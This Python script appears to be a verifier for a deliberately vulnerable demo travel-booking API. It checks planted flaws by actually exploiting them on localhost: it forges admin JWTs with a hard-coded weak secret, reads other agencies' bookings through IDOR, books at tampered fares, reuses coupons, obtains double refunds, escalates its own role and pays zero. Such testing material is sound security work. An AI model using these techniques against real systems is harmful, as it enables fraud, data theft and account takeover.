#!/usr/bin/env python3
"""Verify the AstraTravel demo platform against the ground truth in
../DEMO_PLATFORM_SPEC.md, using real HTTP calls.

Usage:
    python3 verify.py            # uses a server already on localhost:8000,
                                # or starts one (venv uvicorn) if none is up
    python3 verify.py --no-start # fail if no server is already running

Checks all 10 planted findings, both negative controls, and the stretch
pay-with-0 flaw. Prints a PASS/FAIL summary and exits non-zero on any failure.
Only the Python standard library is used (plus PyJWT-free token forging via
hmac, so the weak-secret proof needs no extra install).
"""

import base64
import hashlib
import hmac
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

BASE = "http://127.0.0.1:8000"
HERE = Path(__file__).resolve().parent
JWT_SECRET = "travel123"  # the planted weak secret (spec flaw #8)

results = []  # (name, passed, detail)


def check(name, passed, detail=""):
    results.append((name, passed, detail))
    print(f"[{'PASS' if passed else 'FAIL'}] {name}"
          + (f" — {detail}" if detail else ""))


def req(method, path, token=None, body=None):
    """One HTTP call. Returns (status, parsed-json-or-text)."""
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method)
    r.add_header("Content-Type", "application/json")
    if token:
        r.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            raw = resp.read().decode()
            try:
                return resp.status, json.loads(raw)
            except json.JSONDecodeError:
                return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def login(username):
    status, data = req("POST", "/auth/login",
                       body={"username": username, "password": "Test@1234"})
    assert status == 200, f"login failed for {username}: {data}"
    return data["access_token"]


def forge_token(username, agency_id, role):
    """Forge a JWT with the known weak secret — no password needed.
    (Proves flaw #8: anyone who guesses 'travel123' can mint any identity.)"""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps({
        "sub": username, "agency_id": agency_id, "role": role,
        "exp": int(time.time()) + 3600,
    }).encode()).rstrip(b"=").decode()
    sig = hmac.new(JWT_SECRET.encode(), f"{header}.{payload}".encode(),
                   hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{header}.{payload}.{sig_b64}"


def fresh_booking(token, total=None):
    """Hold + book a flight; returns the booking dict."""
    _, hold = req("POST", "/bookings/hold", token,
                  {"flight_id": "AI-302", "travellers": 2})
    body = {"hold_id": hold["hold_id"]}
    if total is not None:
        body["total"] = total
    status, booking = req("POST", "/bookings", token, body)
    assert status == 200, f"booking failed: {booking}"
    return booking


def wait_for_server(timeout=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status, _ = req("GET", "/health")
            if status == 200:
                return True
        except Exception:
            pass
        time.sleep(0.5)
    return False


def main():
    start_server = "--no-start" not in sys.argv
    proc = None
    if not wait_for_server(timeout=2):
        if not start_server:
            print("FAIL: no server on localhost:8000 (and --no-start given)")
            return 1
        print("No server running — starting uvicorn …")
        proc = subprocess.Popen(
            [str(HERE / "venv" / "bin" / "uvicorn"), "app:app",
             "--host", "127.0.0.1", "--port", "8000"],
            cwd=str(HERE), stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)
        if not wait_for_server():
            print("FAIL: server did not come up")
            proc.terminate()
            return 1

    try:
        sky = login("sky_agent1")
        globe = login("globe_agent1")
        admin = login("platform_admin")

        # A GlobeTrek booking to attack from the SkyWays side.
        _, globe_list = req("GET", "/bookings?agency_id=ag_globetrek", globe)
        globe_booking = globe_list["bookings"][0]["id"]

        # --- Ground truth #1: IDOR on GET /bookings/{id} ---
        s, b = req("GET", f"/bookings/{globe_booking}", sky)
        check("1. IDOR — cross-agency booking read",
              s == 200 and b.get("agency_id") == "ag_globetrek"
              and bool(b.get("travellers")),
              f"sky_agent1 read {globe_booking} (status {s})")

        # --- Ground truth #2: fare tampering ---
        b = fresh_booking(sky, total=1)
        check("2. Fare tampering — book at Rs. 1",
              b.get("total") == 1, f"booking {b['id']} total = {b['total']}")

        # --- Ground truth #3: single-use coupon reuse ---
        b = fresh_booking(sky)
        s1, r1 = req("POST", "/coupons/apply", sky,
                     {"code": "FLY10", "booking_id": b["id"]})
        s2, r2 = req("POST", "/coupons/apply", sky,
                     {"code": "FLY10", "booking_id": b["id"]})
        check("3. Coupon reuse — single-use FLY10 applied twice",
              s1 == 200 and s2 == 200 and r2.get("times_applied") == 2,
              f"1st -> {r1.get('new_total')}, 2nd -> {r2.get('new_total')}")

        # --- Ground truth #4: double refund ---
        b = fresh_booking(sky)
        req("POST", f"/bookings/{b['id']}/pay", sky,
            {"amount": b["total"], "method": "card"})
        _, c1 = req("POST", f"/bookings/{b['id']}/cancel", sky,
                    {"reason": "traveller request"})
        _, c2 = req("POST", f"/bookings/{b['id']}/cancel", sky,
                    {"reason": "traveller request"})
        check("4. Double refund — cancel twice pays twice",
              c1.get("refunds_issued") == 1 and c2.get("refunds_issued") == 2,
              f"refunds issued: {c2.get('refunds_issued')}")

        # --- Ground truth #5: sub-agent -> admin escalation ---
        s, r = req("POST", "/admin/users/sky_agent2/role",
                   login("sky_agent2"), {"role": "agency_admin"})
        escalated = s == 200 and r.get("role") == "agency_admin"
        # Restore the seed role so the demo stays clean.
        req("POST", "/admin/users/sky_agent2/role", admin,
            {"role": "sub_agent"})
        check("5. Privilege escalation — sub-agent promotes self",
              escalated, f"sky_agent2 role -> {r.get('role')}")

        # --- Ground truth #6: zombie API, no auth ---
        s, b = req("GET", f"/v1/bookings/{globe_booking}")
        check("6. Zombie API — /v1/bookings with NO token",
              s == 200 and bool(b.get("travellers")),
              f"status {s}, PII returned: {bool(b.get('travellers'))}")

        # --- Ground truth #7: shadow API ---
        s, r = req("POST", "/internal/supplier-sync", sky,
                   {"supplier": "amadeus", "inventory": ["AI-302"]})
        check("7. Shadow API — /internal/supplier-sync",
              s == 200 and r.get("status") == "synced",
              f"status {s}, {r.get('status')}")

        # --- Ground truth #8: weak JWT secret, forged token ---
        forged = forge_token("platform_admin", None, "platform_admin")
        s, b = req("GET", f"/bookings/{globe_booking}", forged)
        check("8. Weak JWT secret — forged platform_admin token accepted",
              s == 200, f"status {s} with a token minted from 'travel123'")

        # --- Ground truth #9: no rate limiting ---
        codes = [req("POST", "/auth/login",
                     body={"username": "sky_agent1",
                           "password": "wrong"})[0] for _ in range(30)]
        check("9. No rate limiting — 30 bad logins, no 429",
              429 not in codes and all(c == 401 for c in codes),
              f"statuses: {sorted(set(codes))}")

        # --- Ground truth #10: fresh IDOR in v2.4.0 ---
        s, _ = req("POST", f"/v2/bookings/{globe_booking}/fare-modify",
                   sky, {"new_fare": 5})
        before_ok = s == 404
        s, _ = req("POST", "/demo/deploy", admin, {"version": "v2.4.0"})
        deployed = s == 200
        s, b = req("POST", f"/v2/bookings/{globe_booking}/fare-modify",
                   sky, {"new_fare": 5})
        check("10. Fresh IDOR — v2.4.0 fare-modify (after live deploy)",
              before_ok and deployed and s == 200 and b.get("fare") == 5,
              f"before deploy: 404={before_ok}, deployed={deployed}, "
              f"cross-agency fare rewrite status {s}")

        # --- Negative control A: agency filter enforced on list ---
        s, _ = req("GET", "/bookings?agency_id=ag_globetrek", sky)
        check("Control A — list another agency's bookings is blocked",
              s == 403, f"status {s} (must be 403)")

        # --- Negative control B: search is for logged-in users only ---
        s, r = req("GET", "/search/flights?from=DEL&to=BOM", sky)
        ok_logged_in = s == 200 and len(r.get("results", [])) > 0
        s2, _ = req("GET", "/search/flights?from=DEL&to=BOM")
        check("Control B — search works logged-in, 401 anonymous",
              ok_logged_in and s2 == 401,
              f"logged-in {s}, anonymous {s2}")

        # --- Bonus (stretch flaw): pay with amount 0 ---
        b = fresh_booking(sky)
        s, r = req("POST", f"/bookings/{b['id']}/pay", sky,
                   {"amount": 0, "method": "card"})
        check("Bonus. Skipped payment — pay Rs. 0 marks booking PAID",
              s == 200 and r.get("status") == "PAID"
              and r.get("paid_amount") == 0,
              f"status {s}, paid_amount {r.get('paid_amount')}")

        # Restore the demo to a clean state (seed data + v2.3.0).
        req("POST", "/demo/reset", admin)
    finally:
        if proc is not None:
            proc.terminate()
            proc.wait(timeout=5)

    passed = sum(1 for _, ok, _ in results if ok)
    print(f"\n{passed}/{len(results)} checks passed")
    return 0 if passed == len(results) else 1


if __name__ == "__main__":
    sys.exit(main())
